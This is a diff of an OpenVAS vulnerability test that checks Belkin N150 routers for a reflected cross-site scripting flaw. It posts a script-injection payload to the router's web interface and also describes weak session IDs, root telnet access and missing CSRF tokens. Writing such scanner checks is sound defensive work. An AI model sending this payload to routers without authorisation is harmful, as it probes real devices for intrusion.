@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_belkin_router_multiple_vuln.nasl 5390 2017-02-21 18:39:27Z mime $
+# $Id: gb_belkin_router_multiple_vuln.nasl 10844 2018-08-08 14:38:33Z cfischer $
 #
 # Belkin N150 Wireless Home Router Multiple Vulnerabilities
 #
@@ -27,13 +27,21 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806170");
-  script_version("$Revision: 5390 $");
+  script_version("$Revision: 10844 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-08 16:38:33 +0200 (Wed, 08 Aug 2018) $");
   script_tag(name:"creation_date", value:"2015-12-02 14:31:19 +0530 (Wed, 02 Dec 2015)");
-  script_tag(name:"qod_type", value:"remote_vul");
   script_name("Belkin N150 Wireless Home Router Multiple Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("gb_get_http_banner.nasl");
+  script_mandatory_keys("mini_httpd/banner");
+  script_require_ports("Services/www", 8080);
+
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38840");
+  script_xref(name:"URL", value:"https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities");
 
   script_tag(name:"summary", value:"This host is running Belkin Router and is
   prone to multiple vulnerabilities.");
@@ -42,13 +50,17 @@ if(description)
   check whether it is able to read read cookie or not.");
 
   script_tag(name:"insight", value:"The flaws are due to,
+
   - The 'InternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language' parameter is
     not validated properly.
+
   - The sessionid is allocated using hex encoding and of fixed length 8.
     Therefore, it is very easy to bruteforce it in feasible amount for time as
     this session id ranges from 00000000 to ffffffff.
+
   - The Telnet protocol can be used by an attacker to gain remote access to the
     router with root privileges.
+
   - The Request doesn't contain any CSRF-token. Therefore, requests can be
     forged.It can be verified with any request.");
 
@@ -59,58 +71,34 @@ if(description)
 
   Impact Level: Application");
 
-  script_tag(name:"affected", value:"
-  Belkin N150 WiFi N Router, other firmware may also be affected.");
+  script_tag(name:"affected", value:"Belkin N150 WiFi N Router, other firmware may also be affected.");
 
-  script_tag(name: "solution" , value:"No solution or patch was made available for
-  at least one year since disclosure of this vulnerability. Likely none will be
+  script_tag(name:"solution", value:"No known solution was made available for
+  at least one year since the disclosure of this vulnerability. Likely none will be
   provided anymore. General solution options are to upgrade to a newer release,
   disable respective features, remove the product or replace the product by
   another one.");
 
-  script_tag(name:"solution_type",value:"NoneAvailable");
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"qod_type", value:"remote_vul");
 
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/38840");
-  script_xref(name : "URL" , value : "https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
-  script_family("Web application abuses");
-  script_dependencies("gb_get_http_banner.nasl");
-  script_mandatory_keys("mini_httpd/banner");
-  script_require_ports("Services/www", 8080);
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-host = "";
-asport = "";
-banner = "";
-
-## Get HTTP Port
 asport = get_http_port(default:8080);
-if(!asport){
-  exit(0);
-}
 
-##Get banner
 banner = get_http_banner(port: asport);
 if(!banner){
   exit(0);
 }
 
-host = http_host_name( port:asport);
-if(!host){
-  exit(0);
-}
+if(banner =~ 'Server: mini_httpd'){
 
-## Confirm the device from banner
-if(banner =~ 'Server: mini_httpd')
-{
+  host = http_host_name( port:asport);
+
   postdata = '%3AInternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language=' +
              '"><script>alert(document.cookie)</script><script>"&obj-a' +
              'ction=set&var%3Apage=deviceinfo&var%3Aerrorpage=devicein' +
@@ -118,7 +106,8 @@ if(banner =~ 'Server: mini_httpd')
              '&var%3ACacheLastData=U1BBTl9UaW1lTnVtMT0%3D';
   len = strlen( postdata );
 
-  req = 'POST /cgi-bin/webproc HTTP/1.1\r\n' +
+  url = "/cgi-bin/webproc";
+  req = 'POST ' + url + ' HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
         'User-Agent: ' + OPENVAS_HTTP_USER_AGENT +'\r\n' +
         'DNT: 1\r\n' +
@@ -127,10 +116,12 @@ if(banner =~ 'Server: mini_httpd')
         postdata;
   res = http_keepalive_send_recv( port:asport, data:req );
 
-  ## Confirm the exploit
-  if(res =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script><script>" >< res)
-  {
-    security_message(port:asport);
+  if(res =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script><script>" >< res){
+    report = report_vuln_url(port:asport, url:url);
+    security_message(port:asport, url:url);
     exit(0);
   }
+  exit(99);
 }
+
+exit(0);
